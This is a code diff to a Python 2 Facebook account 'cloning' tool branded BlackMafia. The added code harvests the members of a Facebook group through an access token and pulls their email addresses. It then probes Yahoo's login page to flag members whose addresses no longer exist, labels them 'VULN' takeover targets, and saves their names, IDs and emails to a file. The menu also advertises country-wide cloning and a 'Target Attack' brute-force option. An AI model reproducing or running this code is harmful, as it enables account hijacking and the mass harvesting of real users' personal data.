@@ -240,16 +240,17 @@ def menu():
 	print "	   \033[1;93m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
 	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mStart Cloning India"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mStart Cloning Pakistan"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95mStart Cloning USA"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94mStart Cloning Bangladash"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;93mStart Cloning All Country"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;92mStart Target  Attack"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\x1b[1;91mBlack Mafia   Massage "
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m9.\033[1;93mAfter Cloning Data Reset"
-	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91mlogout "
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Cloning Pakistan ID&(Group)"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Cloning Indonasia"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Cloning USA"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Cloning Bangladash"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Mafia   Massage "
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m10.\033[1;93mAfter Cloning Data Reset"
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91m logout "
 	pilih()
 
 
@@ -271,16 +272,18 @@ def pilih():
         elif unikers =="6":
 		test()
         elif unikers =="7":
+		clone_dari_member_group()
+        elif unikers =="8":
 		os.system('clear')
 		print logo
 		brute()
-        elif unikers =="8":
+        elif unikers =="9":
 		os.system('clear')
 		print logo
 		print " \033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Massage•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
                 jalan('\033[1;92m............Massage..........')
                 jalan("\033[1;96mFrends Tool everyDay Update")
-                jalan('\033[1;96m7 Num Option Use every day ')
+                jalan('\033[1;96m11 Num Option Use every day ')
                 jalan('\033[1;96mChenal Off Due to Strik')
                 jalan("\033[1;93m.........Command...........")
                 jalan('\033[1;96mapt update')
@@ -300,7 +303,7 @@ def pilih():
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
-	elif unikers =="9":
+	elif unikers =="10":
 		os.system('clear')
 		print logo
 		print " \033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Data Reset•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -340,7 +343,8 @@ def crack():
 	print logo
 	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
         print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Mafia WhatsApp Group Pakistan."
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Mafia Youtube Chenal."
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Mafia Group Cloning."
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;95mBlack Mafia Youtube Chenal."
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
 
@@ -371,6 +375,24 @@ def pilih_crack():
 	        os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
 	        menu()
         elif peak =="3":
+                os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		idg=raw_input('\033[1;96m[+] \033[1;93mClone ID group \033[1;91m:\033[1;97m ')
+		try:
+			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+toket)
+			asw=json.loads(r.text)
+			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
+		except KeyError:
+			print"\033[1;96m[!] \x1b[1;91mGroup not found"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		jalan('\033[1;96m[✺] \033[1;93mClone ID \033[1;97m...')
+		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		s=json.loads(re.text)
+		for p in s['data']:
+			id.append(p['id'])
+        elif peak =="4":
 	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 	        menu()
 	elif peak =="0":
@@ -2171,6 +2193,81 @@ def pilih_super():
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
+
+def clone_dari_member_group():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;96m[!] \x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+	try:
+		os.mkdir('out')
+	except OSError:
+		pass
+	os.system('clear')
+	print logo
+	mpsh = []
+	jml = 0
+	print 42*"\033[1;96m="
+	id=raw_input('\033[1;96m[+] \033[1;93mClone  ID group \033[1;91m:\033[1;97m ')
+	try:
+		r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
+		asw=json.loads(r.text)
+		print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mNama group \033[1;91m:\033[1;97m "+asw['name']
+	except KeyError:
+		print"\033[1;96m[!] \x1b[1;91mGroup not found"
+		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+		menu()
+	jalan('\033[1;96m[✺] \033[1;93mMengambil email \033[1;97m...')
+	teman = requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
+	kimak = json.loads(teman.text)
+	jalan('\033[1;96m[✺] \033[1;93mStart \033[1;97m...')
+	print('\x1b[1;96m[!] \x1b[1;93mStop CTRL+z')
+	print 42*"\033[1;96m="
+	for w in kimak['data']:
+		jml +=1
+		mpsh.append(jml)
+		id = w['id']
+		nama = w['name']
+		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		z = json.loads(links.text)
+		try:
+			mail = z['email']
+			yahoo = re.compile(r'@.*')
+			otw = yahoo.search(mail).group()
+			if 'yahoo.com' in otw:
+				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
+				br._factory.is_html = True
+				br.select_form(nr=0)
+				br["username"] = mail
+				klik = br.submit().read()
+				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
+				try:
+					pek = jok.search(klik).group()
+				except:
+					continue
+				if '"messages.ERROR_INVALID_USERNAME">' in pek:
+					print("\033[1;96m[✓] \033[1;92mVULN")
+					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
+					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
+					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
+					save = open('out/GrupMailVuln.txt','a')
+					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
+					save.close()
+					berhasil.append(mail)
+		except KeyError:
+			pass
+	print 42*"\033[1;96m="
+	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
+	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
+	print"\033[1;96m[+] \033[1;92mFile lovehacker\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+	menu()
+	
 def brute():
     os.system('clear')
     try:
